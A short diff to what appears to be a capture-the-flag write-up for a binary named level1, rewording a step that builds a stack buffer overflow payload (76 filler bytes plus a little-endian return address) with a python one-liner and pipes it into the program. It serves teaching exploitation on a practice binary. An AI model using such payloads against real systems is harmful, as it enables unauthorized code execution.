@@ -9,7 +9,7 @@
 
 - We need to overflow the buffer in the main and go to 0x08048444 (run address)
 
-- Create a payload: python -c "print 'a' * 76 + '\x44\x84\x04\x08'" > /tmp/payload && cat /tmp/payload - | ./level1
+- Create and exec a payload: python -c "print 'a' * 76 + '\x44\x84\x04\x08'" > /tmp/payload && cat /tmp/payload - | ./level1
 
 > Explanation: buffer size = 80 - adress size = 76 so we print any char 76 times
 > 0x08048444 = 0x08 0x04 0x84 0x44 because it's a 4-bytes value
